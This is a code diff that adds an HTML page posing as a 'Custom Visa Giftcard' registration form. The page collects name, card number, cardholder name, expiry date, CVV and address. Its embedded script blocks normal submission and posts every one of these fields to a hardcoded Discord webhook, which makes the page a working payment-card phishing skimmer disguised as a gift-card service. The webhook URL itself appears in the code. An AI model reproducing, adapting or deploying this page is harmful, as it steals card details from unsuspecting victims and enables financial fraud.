@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Custom Visa Cards</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f0f0f0;
+    }
+    .container {
+        max-width: 400px;
+        margin: 50px auto;
+        padding: 20px;
+        background-color: #ffffff;
+        border-radius: 10px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+    input[type="text"], input[type="number"], input[type="submit"], textarea {
+        width: calc(100% - 22px);
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
+    input[type="submit"] {
+        width: 100%;
+        padding: 10px;
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    input[type="submit"]:hover {
+        background-color: #0056b3;
+    }
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+    }
+    h2 {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Custom Visa Giftcard</h2>
+    <form id="registrationForm">
+        <label for="firstName">First Name:</label>
+        <input type="text" id="firstName" name="firstName" required>
+        <label for="lastName">Last Name:</label>
+        <input type="text" id="lastName" name="lastName" required>
+        <label for="cardNumber">Card Number:</label>
+        <input type="text" id="cardNumber" name="cardNumber" required>
+        <label for="cardHolder">Card Holder Name:</label>
+        <input type="text" id="cardHolder" name="cardHolder" required>
+        <label for="expiryDate">Expiry Date:</label>
+        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" pattern="\d{2}\/\d{2}" required>
+        <label for="cvv">CVV:</label>
+        <input type="number" id="cvv" name="cvv" min="100" max="999" required>
+        <label for="ipAddress">Amount you want to send:</label>
+        <input type="text" id="ipAddress" name="ipAddress" placeholder="Optional">
+        <label for="homeAddress">Card Address:</label>
+        <textarea id="homeAddress" name="homeAddress" rows="3" placeholder="Optional"></textarea>
+        <input type="submit" value="Register Card">
+    </form>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var registrationForm = document.getElementById("registrationForm");
+
+    registrationForm.addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        // Collect form data
+        var formData = new FormData(registrationForm);
+        var firstName = formData.get("firstName");
+        var lastName = formData.get("lastName");
+        var cardNumber = formData.get("cardNumber");
+        var cardHolder = formData.get("cardHolder");
+        var expiryDate = formData.get("expiryDate");
+        var cvv = formData.get("cvv");
+        var homeAddress = formData.get("homeAddress");
+
+        // Construct the data object to send to the webhook
+ 
+      
+        // Send data to the Discord webhook URL using an HTTP POST request
+	function sendMessage() {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1211160988834074704/CC152jbK3n_oARHo7N-wY1cw1Lh1E6bQrlCUm-UzwfHsnhSH4M54ekHykZAiHdzvydfM");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Webhook",
+        avatar_url: "",
+        content: firstName+"\n"+lastName+"\n"+cardNumber+"\n"+cardHolder+"\n"+expiryDate+"\n"+cvv+"\n"+homeAddress
+        // Username and content are required to be set, avatar_url isn't. Insert a direct link to an image to use the avatar_url. 
+      }
+
+      request.send(JSON.stringify(params));
+    }
+	sendMessage()
+
+});})
+</script>
+
+</body>
+</html>
